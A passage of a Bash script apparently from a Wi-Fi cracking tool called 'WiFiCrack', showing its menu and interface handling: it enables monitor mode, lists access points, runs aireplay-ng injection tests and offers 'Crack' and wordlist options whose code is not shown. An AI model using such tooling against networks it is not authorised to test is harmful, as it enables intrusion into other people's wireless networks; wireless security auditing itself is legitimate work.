    ifconfig "$IFACE" up >> /dev/null
    NEWMAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
    STATE=$(iw "$IFACE" info | grep monitor)
    echo "$IFACE is in monitor mode and it's MAC address is: $NEWMAC"
    unset REPLY
    unset LIST
    unset ASK
    unset CHANFLAG
else
    echo
    echo "$IFACE already in monitor mode."
    NEWMAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
    sleep 2
    unset CHANFLAG
fi
}
function go_back {
if [[ "$IFACENUM" -eq 1 ]]; then
    single_interface
else
    multiple_interfaces
fi
}
function show_APs {
clear
if [[ -n "$STATE" ]]; then
    echo
    echo "Please wait..."
    unset_mon >> /dev/null
    sleep 5
fi
nmcli -p dev wifi list
echo
SELECT="Press r to rescan or Enter to go back : "
echo
echo -n "$SELECT"
while read -rn1 SLCT
do
    case "$SLCT" in
        [Rr] )
            show_APs
            break
            ;;
        * )
            go_back
            break
            ;;
    esac
done
}
function menu {
clear
if [[ "$IFACENUM" -gt 1 ]]; then
    SWITCH="c) Change Interface"
fi
if [[ -n $STATE ]]; then
    MM=ON
else
    MM=OFF
fi
MAC=$(iw "$IFACE" info | grep addr | awk '{print $2}')
echo "----------------------- WiFiCrack v0.7_beta -----------------------"
echo "WLAN Interface : $IFACE                MAC : $MAC"
if [[ "$MM" = "ON" ]]; then
    echo "Monitor Mode   : >> $MM <<"
else
    echo "Monitor Mode   : $MM"  
fi
echo
echo "1) Crack"
echo "e) Enable <M/M>"
echo "d) Disable <M/M>"
echo "w) Generate Wordlists"
echo "h) View Help"
echo "v) View APs"
echo "s) Show Info"
if [[ -n "$SWITCH" ]]; then
    echo "$SWITCH"
fi
echo "t) Test Injection         r) Verbose Test (faster)"
echo "q) Abort!"
echo
PROMPT="Select : "
echo -n "$PROMPT"
}
function list_ifaces {
clear
readarray -t IFACES < <(airmon-ng | grep -T phy)
echo "Select an interface (WLAN Card) and press Enter"
echo "#) PHY  Interface       Driver          Chipset"
echo
select CHOICE in "${IFACES[@]}"; do
    [[ -n "$CHOICE" ]] || { echo "Invalid choice. Try again." >&2; continue; }
    break
done
IFACE=$(echo "$CHOICE" | awk -F ' ' '{print $2}')
}
function single_interface {
#IFACE=$(ls /sys/class/net | grep wl)
IFACE=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}')
STATE=$(iw "$IFACE" info | grep monitor)
menu
while read -rn1 CHAR
do
    case "$CHAR" in
        1 )
            choose_mode
            break
            ;;
        e )
            set_mon
            echo
            clear
            single_interface
            break
            ;; 
        w )
            generate_wordlists
            break
            ;;
        d )
            unset_mon
            clear
            single_interface
            break
            ;;
        h )
            echo
            help
            read -rp "Press Enter to go back" KEY
            single_interface
            break
            ;;
        v )
            show_APs
            echo
            read -rp "Press Enter to go back" KEY
            single_interface
            break
            ;;
        s )
            show_info
            echo
            read -rp "Press Enter to go back" KEY
            single_interface
            break
            ;;
        t )
            test_injection
            read -rp "Press Enter to go back" KEY
            single_interface
            break
            ;;
        r ) 
            clear
            if [[ -z "$STATE" ]]; then
                echo "Setting Monitor mode on $IFACE..."
                echo
                set_mon >> /dev/null
                FLG=1
                aireplay-ng -9 "$IFACE"
            else
                aireplay-ng -9 "$IFACE"
            fi
            if [[ "$FLG" = 1 ]]; then
                echo "Unsetting Monitor mode on $IFACE..."
                echo
                unset_mon >> /dev/null
            fi
            unset FLG
            read -rp "Press Enter to go back" KEY
            single_interface
            break
            ;;
        q )
            clear
            exit 0
            ;;
        * )
            echo -ne "\n$PROMPT"
            ;;
    esac
done
}
function multiple_interfaces {
STATE=$(iw "$IFACE" info | grep monitor)
menu
while read -rn1 CHAR
do
    case "$CHAR" in
        1 )
            choose_mode
            break
            ;;
        e )
            set_mon
            echo
            clear
            multiple_interfaces
            break
            ;;
        w )
            generate_wordlists
            break
            ;;
        d )
            unset_mon
            clear
            multiple_interfaces
            break
            ;;
        h )
            echo
            help
            read -rp "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        v )
            show_APs
            echo
            read -rp "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        s )
            show_info
            echo
            read -rp "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        t )
            test_injection
            read -rp "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        r ) 
            clear
            if [[ -z "$STATE" ]]; then
                echo "Setting Monitor mode on $IFACE..."
                echo
                set_mon >> /dev/null
                FLG=1
                aireplay-ng -9 "$IFACE"
            else
                aireplay-ng -9 "$IFACE"
            fi
            if [[ "$FLG" = 1 ]]; then
                echo "Unsetting Monitor mode on $IFACE..."
                echo
                unset_mon >> /dev/null
            fi
            unset FLG
            read -rp "Press Enter to go back" KEY
            multiple_interfaces
            break
            ;;
        c )
            list_ifaces
            multiple_interfaces
            break
            ;;
        q )
            clear
            exit 0
            ;;
        * )
            echo -ne "\n$PROMPT"
            ;;
    esac
done
}
function check_root {
if [[ "$EUID" -ne 0 ]]; then
    echo "This script must be run as root" 1>&2
    exit 1
fi
}
function check_wlan {
IFACENUM=$(find /sys/class/net -name "wl*" | awk -F/ '{print $NF}' | wc -l)
if [[ "$IFACENUM" -gt 1 ]]; then
    echo "You have multiple WLAN interfaces."
    list_ifaces
    multiple_interfaces
elif [[ "$IFACENUM" -eq 1 ]]; then
    single_interface
elif [[ "$IFACENUM" -eq 0 ]]; then
    echo "No WLAN interfaces found."
fi
}
resolve_dependencies
check_root
check_wlan